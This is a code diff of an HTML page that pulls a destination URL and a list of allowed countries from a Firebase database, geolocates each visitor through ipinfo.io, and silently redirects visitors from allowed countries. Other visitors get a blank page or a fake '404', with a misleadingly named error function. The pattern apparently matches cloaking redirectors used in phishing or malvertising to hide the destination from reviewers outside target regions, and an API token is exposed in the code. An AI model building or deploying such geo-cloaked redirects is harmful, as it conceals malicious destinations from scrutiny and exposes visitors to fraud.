@@ -4,7 +4,6 @@
 <meta charset="UTF-8" />
 </head>
 <body>
-  <div id="content"></div>
 <script type="module">
 import { initializeApp } from "https://www.gstatic.com/firebasejs/12.0.0/firebase-app.js";
 import { getAnalytics } from "https://www.gstatic.com/firebasejs/12.0.0/firebase-analytics.js";
@@ -36,7 +35,7 @@ get(dbRef)
       const rg = val.rg;
       allowedCountries = rg.split(' ');
       if (!wrl || !rg) {
-        document.body.innerHTML = '404';
+        ErorDebuger()
         return;
       }
       fetch('https://ipinfo.io/json?token=7519bf9ad9f5eb')
@@ -46,29 +45,33 @@ get(dbRef)
         const contentDiv = document.getElementById('content');
 
         if (!country) {
-          document.body.innerHTML = '404';
+          ErorDebuger()
           return;
         }
 
-        if (allowedCountries.includes(country)) {
-          const en = btoa(unescape(encodeURIComponent(wrl))); 
-          contentDiv.innerText = en;
+        if (allowedCountries.includes(country)) { 
+          console.log(wrl)
+          window.location.replace(wrl)
+          return
         } else {
-          document.body.innerHTML = '404';
+          ErorDebuger()
         }
       })
       .catch(err => {
-        document.body.innerHTML = '404';
+        ErorDebuger()
       });
     } else {
-      document.body.innerHTML = '404';
+      ErorDebuger()
     }
   })
   .catch((error) => {
     console.error(error);
-    document.body.innerHTML = '404';
+    
   });
 
+  function ErorDebuger(){
+    console.log("error-load-privacy")
+  }
 
 </script>
 </body>
